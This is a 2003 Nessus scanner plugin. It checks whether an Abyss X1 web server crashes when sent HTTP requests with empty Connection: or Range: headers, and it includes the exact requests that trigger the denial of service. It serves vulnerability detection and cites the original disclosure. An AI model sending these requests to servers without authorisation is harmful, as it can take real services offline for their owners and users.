#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# GPL
#
# References:
# Date: Sat, 5 Apr 2003 12:21:48 +0000
# From: Auriemma Luigi <aluigi@pivx.com>
# To: bugtraq@securityfocus.com, vulnwatch@vulnwatch.org,
#        full-disclosure@lists.netsys.com, list@dshield.org
# Subject: [VulnWatch] Abyss X1 1.1.2 remote crash
# 


if(description)
{
 script_id(11521);
 script_bugtraq_id(7287);
 script_version ("$Revision: 1.6 $");
 name["english"] = "Abyss httpd crash";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to kill the web server by
sending empty HTTP fields (namely Connection: and Range: ).

An attacker may use this flaw to prevent this host from performing
its job properly.


Solution : If the remote web server is Abyss X1, then upgrade to 
Abyss X1 v.1.1.4, otherwise inform your vendor of this flaw.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Empty HTTP fields crash the remote web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencies("find_service.nes", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

########


include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);

req = string("GET / HTTP/1.0\r\n", "Connection: \r\n\r\n");
soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: req);
r = http_recv(socket:soc);
http_close_socket(soc);



if(http_is_dead(port: port)) { security_hole(port); }



req = string("GET / HTTP/1.0\r\n", "Range: \r\n\r\n");
soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: req);
r = http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port: port)) { security_hole(port); }
